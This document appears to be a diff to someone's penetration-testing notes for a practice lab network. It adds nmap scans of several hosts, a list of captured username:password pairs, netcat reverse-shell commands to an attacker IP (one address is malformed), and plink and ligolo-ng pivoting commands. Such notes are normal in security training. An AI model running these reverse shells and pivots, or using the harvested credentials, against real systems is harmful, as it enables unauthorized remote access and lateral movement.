@@ -83,22 +83,93 @@ PORT     STATE SERVICE VERSION
 8080/tcp open  http    Jetty 9.4.27.v20200227
 Service Info: Host: 127.0.0.1
 
-172.16.1.20
-172.16.1.100
-172.16.1.101
+172.16.1.20 
+Not shown: 978 closed tcp ports (conn-refused)
+PORT      STATE SERVICE            VERSION
+22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)
+53/tcp    open  domain             Simple DNS Plus
+80/tcp    open  http               Microsoft IIS httpd 8.5
+88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2024-03-12 10:05:43Z)
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
+443/tcp   open  ssl/http           Microsoft IIS httpd 8.5
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: DANTE)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ssl/ms-wbt-server?
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+
+172.16.1.37
+
+172.16.1.45 
+
+172.16.1.100 (PWNED)
+Not shown: 995 closed tcp ports (conn-refused)
+PORT      STATE SERVICE  VERSION
+21/tcp    open  ftp      vsftpd 3.0.3
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+1234/tcp  open  hotline?
+65000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+172.16.1.101 
+PORT    STATE SERVICE       VERSION
+21/tcp  open  ftp           FileZilla ftpd
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
 172.16.1.102
+Host is up (0.31s latency).
+Not shown: 993 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
+445/tcp  open  microsoft-ds?
+3306/tcp open  mysql         MySQL (unauthorized)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 james:toyota
 baltazar:TheJoker12345!
 frank:STARS5678FORTUNE401 , TractorHeadtorchDeskmat
 margaret:Welcome1!2@3#
 julian:manchesterunited
+mrb3n:S3kur1ty2020!
 
 admin:admin
 ben:Welcometomyblog
 
+admin:P@$$worD
+
 REVERSE SHELL WINDOWS USING NC.EXE
-nc.exe -e cmd.exe 10.10.14.2 1234
+nc.exe -e cmd.exe 10.10.17.1111 4442
 
 /bin/bash bisa buat pindah user
 sudo -u julian /bin/bash
+
+Forward double pivoting pake plink.exe
+plink.exe -R 4444:127.0.0.1:4444 -l root -P 22 -pw toor 10.10.14.2
+            (port kt):ip port machine
+
+Step step ligolo
+https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
+nc.exe 172.ip.agent 4444 -e /bin/bash
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:9999 
+nc -nvlp 9999
